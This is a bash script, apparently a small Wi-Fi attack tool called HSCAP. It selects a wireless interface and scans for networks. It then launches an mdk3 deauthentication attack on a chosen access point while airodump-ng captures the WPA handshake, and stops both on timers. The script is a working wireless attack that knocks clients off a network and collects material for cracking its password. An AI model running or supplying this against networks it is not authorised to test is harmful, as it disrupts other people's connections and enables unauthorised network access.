#!/bin/bash

trap end_script SIGINT
trap end_script SIGTERM

source ".config"

source "assets/variables.sh"
source "assets/functions.sh"
source "assets/essentials.sh"

clear && echo -en "\\033]0;$ScriptName | $ScriptVersion\\a"

echo -e "\n    $ScriptAuthor      Drinking Coffee 24/7    $CRD "
echo "                                                "
echo "  ----------------- --------------------------  "
echo "                                                "
echo "  ██╗  ██╗ ███████╗  ██████╗  █████╗  ██████╗   "
echo "  ██║  ██║ ██╔════╝ ██╔════╝ ██╔══██╗ ██╔══██╗  "
echo "  ███████║ ███████╗ ██║      ███████║ ██████╔╝  "
echo "  ██╔══██║ ╚════██║ ██║      ██╔══██║ ██╔═══╝   "
echo "  ██║  ██║ ███████║ ╚██████╗ ██║  ██║ ██║       "
echo "  ╚═╝  ╚═╝ ╚══════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═╝       "
echo "                                                "
echo "  ----------------- --------------------------  "
echo "                                                "

check_root
check_bash
check_caps

echo -en "$CLYW" "\n\n Press [ENTER] to continue ... "
read -r continue

echo -en "\\033]0;Interface Selection\\a"
interface_selection

echo -en "\\033]0;Explore For Networks\\a"
explore_for_networks

clear

echo "${bssid}" > "${TmpDIR}bl.txt"

xterm +j -fg red -geometry "$XTermGeometry" -T "mdk3 amok attack" -e mdk3 "$Interface" d -b "${TmpDIR}bl.txt" -c "${channel}" > /dev/null 2>&1 &
ProcessIdAttack=$!

xterm +j -geometry "$XTermGeometry" -T "Capturing HandShake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${TmpDIR}HandShake" "$Interface" > /dev/null 2>&1 &
ProcessIdCapture=$!

sleep $Mdk3TimeAttack && kill $ProcessIdAttack
sleep $AirTimeCapture && kill $ProcessIdCapture

end_script
